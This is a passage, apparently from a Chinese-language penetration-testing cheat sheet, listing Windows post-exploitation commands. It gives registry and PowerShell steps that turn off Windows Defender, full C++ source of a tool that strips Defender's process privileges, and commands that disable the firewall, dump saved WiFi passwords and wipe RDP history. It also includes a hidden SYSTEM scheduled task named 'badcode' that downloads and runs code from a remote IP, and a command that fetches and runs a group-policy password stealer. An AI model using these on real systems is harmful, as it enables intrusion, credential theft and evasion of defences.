Center\Provider\Av\&#123;D68DDC3A-831F-4fae-9E44-DA132C1ACF46&#125;&quot;</span> /v STATE /t reg_dword /d <span class="string">&quot;0x00060100&quot;</span> /f</span><br><span class="line"><span class="comment">#C:\tmp加白名单</span></span><br><span class="line">powershell <span class="literal">-Command</span> <span class="built_in">Add-MpPreference</span> <span class="literal">-ExclusionPath</span> <span class="string">&quot;C:\tmp&quot;</span>  </span><br></pre></td></tr></table></figure><h5 id="不需要重启方式"><a href="#不需要重启方式" class="headerlink" title="不需要重启方式"></a>不需要重启方式</h5><p>需要通过TrustedInstaller来进行，AdvancedRun<a href="https://www.nirsoft.net/utils/advanced_run.html">原始地址</a>  <a href="https://github.com/Ascotbe/Image/blob/master/Windows/AdvancedRun.exe">备份地址</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过管理员权限提升到TrustedInstaller权限</span></span><br><span class="line">AdvancedRun.exe /EXEFilename <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /RunAs <span class="number">8</span> /Run</span><br><span class="line"><span class="comment">#直接注册表关闭</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> /v DisableAntiSpyware /t reg_dword /d <span class="number">1</span> /f</span><br></pre></td></tr></table></figure><h4 id="通过powershell"><a href="#通过powershell" class="headerlink" title="通过powershell"></a>通过powershell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$preferences</span> = <span class="built_in">Get-MpPreference</span></span><br><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> (!<span class="variable">$preferences</span>.DisableRealtimeMonitoring)</span><br></pre></td></tr></table></figure><h4 id="通过降低进程token权限"><a href="#通过降低进程token权限" class="headerlink" title="通过降低进程token权限"></a>通过降低进程token权限</h4><p>GitHub上的一个开源项目，可以看看思路，<a href="https://github.com/Octoberfest7/KillDefender/blob/main/killdefender.cpp">代码来源</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID sedebugnameValue;</span><br><span class="line">    TOKEN_PRIVILEGES tkp;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>   FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = sedebugnameValue;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tkp, <span class="built_in">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getpid</span><span class="params">(LPCWSTR procname)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    DWORD procPID = <span class="number">0</span>;</span><br><span class="line">    LPCWSTR processName = <span class="string">L&quot;&quot;</span>;</span><br><span class="line">    PROCESSENTRY32 processEntry = &#123;&#125;;</span><br><span class="line">    processEntry.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// replace this with Ntquerysystemapi</span></span><br><span class="line">    HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, procPID);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;processEntry))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (_wcsicmp(processName, procname) != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Process32Next</span>(snapshot, &amp;processEntry);</span><br><span class="line">            processName = processEntry.szExeFile;</span><br><span class="line">            procPID = processEntry.th32ProcessID;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Got %ls PID: %d\n&quot;</span>, procname, procPID);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> procPID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetPrivilege</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE hToken,          <span class="comment">// access token handle</span></span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpszPrivilege,  <span class="comment">// name of privilege to enable/disable</span></span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bEnablePrivilege   <span class="comment">// to enable or disable privilege</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">LookupPrivilegeValue</span>(</span><br><span class="line">        <span class="literal">NULL</span>,            <span class="comment">// lookup privilege on local system</span></span><br><span class="line">        lpszPrivilege,   <span class="comment">// privilege to lookup </span></span><br><span class="line">        &amp;luid))        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_REMOVED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_REMOVED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">AdjustTokenPrivileges</span>(</span><br><span class="line">        hToken,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;tp,</span><br><span class="line">        <span class="built_in">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">        (PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">        (PDWORD)<span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetLastError</span>() == ERROR_NOT_ALL_ASSIGNED)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LUID sedebugnameValue;</span><br><span class="line">    <span class="built_in">EnableDebugPrivilege</span>();</span><br><span class="line">    <span class="comment">//Get pid for winlogon process</span></span><br><span class="line">    <span class="type">wchar_t</span> procname[<span class="number">80</span>] = <span class="string">L&quot;winlogon.exe&quot;</span>;</span><br><span class="line">    <span class="type">int</span> pid = <span class="built_in">getpid</span>(procname);</span><br><span class="line">    <span class="comment">//Open handle to winlogon</span></span><br><span class="line">    HANDLE phandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid); <span class="comment">//PROCESS_QUERY_LIMITED_INFORMATION</span></span><br><span class="line">    <span class="comment">//Open winlogon process token</span></span><br><span class="line">    HANDLE ptoken;</span><br><span class="line">    <span class="built_in">OpenProcessToken</span>(phandle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, &amp;ptoken);</span><br><span class="line">    <span class="comment">//Impersonate System via winlogon&#x27;s process token</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ImpersonateLoggedOnUser</span>(ptoken))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Impersonated System!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to impersonate System...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(phandle);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(ptoken);</span><br><span class="line">    <span class="type">wchar_t</span> procname2[<span class="number">80</span>] = <span class="string">L&quot;MsMpEng.exe&quot;</span>;</span><br><span class="line">    pid = <span class="built_in">getpid</span>(procname2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;PID %d\n&quot;, pid);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Killing Defender...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hardcoding PID of msmpeng for now</span></span><br><span class="line">    phandle = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid); <span class="comment">//PROCESS_QUERY_LIMITED_INFORMATION</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (phandle != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Handle\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Process Handle\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;%p\n&quot;, phandle);</span></span><br><span class="line">    </span><br><span class="line">    BOOL token = <span class="built_in">OpenProcessToken</span>(phandle, TOKEN_ALL_ACCESS, &amp;ptoken);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Token Handle\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Target Token Handle\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    TOKEN_PRIVILEGES tkp;</span><br><span class="line"></span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = sedebugnameValue;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">AdjustTokenPrivileges</span>(ptoken, FALSE, &amp;tkp, <span class="built_in">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to Adjust Token&#x27;s Privileges\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove all privileges</span></span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_DEBUG_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_TCB_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_IMPERSONATE_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_LOAD_DRIVER_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_RESTORE_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_BACKUP_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_SECURITY_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_SHUTDOWN_NAME, TRUE);</span><br><span class="line">    <span class="built_in">SetPrivilege</span>(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Removed All Privileges\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    SID integrityLevelSid&#123;&#125;;</span><br><span class="line">    integrityLevelSid.Revision = SID_REVISION;</span><br><span class="line">    integrityLevelSid.SubAuthorityCount = <span class="number">1</span>;</span><br><span class="line">    integrityLevelSid.IdentifierAuthority.Value[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">    integrityLevelSid.SubAuthority[<span class="number">0</span>] = integrityLevel;</span><br><span class="line"></span><br><span class="line">    TOKEN_MANDATORY_LABEL tokenIntegrityLevel = &#123;&#125;;</span><br><span class="line">    tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;</span><br><span class="line">    tokenIntegrityLevel.Label.Sid = &amp;integrityLevelSid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">SetTokenInformation</span>(</span><br><span class="line">        ptoken,</span><br><span class="line">        TokenIntegrityLevel,</span><br><span class="line">        &amp;tokenIntegrityLevel,</span><br><span class="line">        <span class="built_in">sizeof</span>(TOKEN_MANDATORY_LABEL) + <span class="built_in">GetLengthSid</span>(&amp;integrityLevelSid)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;SetTokenInformation failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] Token Integrity set to Untrusted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(ptoken);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(phandle);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="防火墙相关"><a href="#防火墙相关" class="headerlink" title="防火墙相关"></a>防火墙相关</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Windows Server 2003 系统及之前版本</span></span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable  </span><br><span class="line"><span class="comment">#Windows Server 2003 系统之后版本</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state on</span><br></pre></td></tr></table></figure><h3 id="获取WiFi密码"><a href="#获取WiFi密码" class="headerlink" title="获取WiFi密码"></a>获取WiFi密码</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>) <span class="keyword">do</span> @<span class="built_in">echo</span> %j | findstr <span class="literal">-i</span> <span class="literal">-v</span> <span class="built_in">echo</span> | netsh wlan show profiles %j key=<span class="built_in">clear</span></span><br></pre></td></tr></table></figure><h3 id="使用脚本清除RDP连接历史记录"><a href="#使用脚本清除RDP连接历史记录" class="headerlink" title="使用脚本清除RDP连接历史记录"></a>使用脚本清除RDP连接历史记录</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BAT</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">reg delete <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot;</span> /va /f</span><br><span class="line">reg delete <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;</span> /f</span><br><span class="line">reg add <span class="string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot;</span></span><br><span class="line"><span class="built_in">cd</span> %userprofile%\documents\</span><br><span class="line">attrib Default.rdp <span class="literal">-s</span> <span class="literal">-h</span></span><br><span class="line"><span class="built_in">del</span> Default.rdp</span><br></pre></td></tr></table></figure><h3 id="本地Administrator提升到System权限"><a href="#本地Administrator提升到System权限" class="headerlink" title="本地Administrator提升到System权限"></a>本地Administrator提升到System权限</h3><h4 id="通过powershell-1"><a href="#通过powershell-1" class="headerlink" title="通过powershell"></a>通过powershell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-ep</span> bypass <span class="string">&quot;Install-Module -Name NtObjectManager;start-Win32ChildProcess cmd&quot;</span></span><br></pre></td></tr></table></figure><h4 id="通过计划任务"><a href="#通过计划任务" class="headerlink" title="通过计划任务"></a>通过计划任务</h4><p>通过at命令实现(只适用于win7)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#以system权限在早晨7.50分启动notepad</span><br><span class="line">at 7:50 notepad.exe</span><br></pre></td></tr></table></figure><p>通过schtasks实现(win7-win10)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#以system权限在每天早晨7.50分启动notepad</span><br><span class="line">schtasks /Create /TN badcode /SC DAILY /ST 07:50 /TR &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(\\\&quot;http://123.123.123.123/a\\\&quot;))\&quot;&quot; /RU SYSTEM</span><br><span class="line">schtasks /run /tn badcode</span><br><span class="line">schtasks /Query /TN badcode</span><br><span class="line">schtasks /Delete /TN badcode /F</span><br></pre></td></tr></table></figure><h4 id="通过psexec"><a href="#通过psexec" class="headerlink" title="通过psexec"></a>通过psexec</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#隐藏打开的notepad的窗口</span><br><span class="line">psexec.exe -accepteula -s -d notepad.exe</span><br><span class="line">#以交互式的形式打开notepad</span><br><span class="line">psexec.exe -accepteula -s -i notepad.exe</span><br></pre></td></tr></table></figure><h3 id="锁屏命令"><a href="#锁屏命令" class="headerlink" title="锁屏命令"></a>锁屏命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure><h3 id="查询应用的组策略"><a href="#查询应用的组策略" class="headerlink" title="查询应用的组策略"></a>查询应用的组策略</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpresult /r &gt;c:\results.txt</span><br></pre></td></tr></table></figure><h3 id="组策略凭据获取"><a href="#组策略凭据获取" class="headerlink" title="组策略凭据获取"></a>组策略凭据获取</h3><h4 id="远程使用"><a href="#远程使用" class="headerlink" title="远程使用"></a>远程使用</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe <span class="literal">-Exec</span> Bypass <span class="literal">-C</span> <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;</span></span><br></pre></td></tr></table></figure><h4 id="本地导入"><a href="#本地导入" class="headerlink" title="本地导入"></a>本地导入</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Get-GPPPassword</span>.ps1</span><br><span class="line"><span class="built_in">Get-GPPPassword</span></span><br></pre></td></tr></table></figure><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -<span class="built_in">exec</span> bypass -<span class="built_in">command</span> <span class="string">&quot;&amp;&#123;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword&#125;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="补丁对比"><a href="#补丁对比" class="headerlink" title="补丁对比"></a>补丁对比</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bitsadmin/wesng</span><br><span class="line"><span class="built_in">cd</span> wesng</span><br><span class="line"><span class="comment">#systeminfo.txt 是目标机器上的systeminfo命令的结果</span></span><br><span class="line">python3 wes.py -e systeminfo.txt</span><br></pre></td></tr></table></figure><h2 id="域内相关操作"><a href="#域内相关操作" class="headerlink" 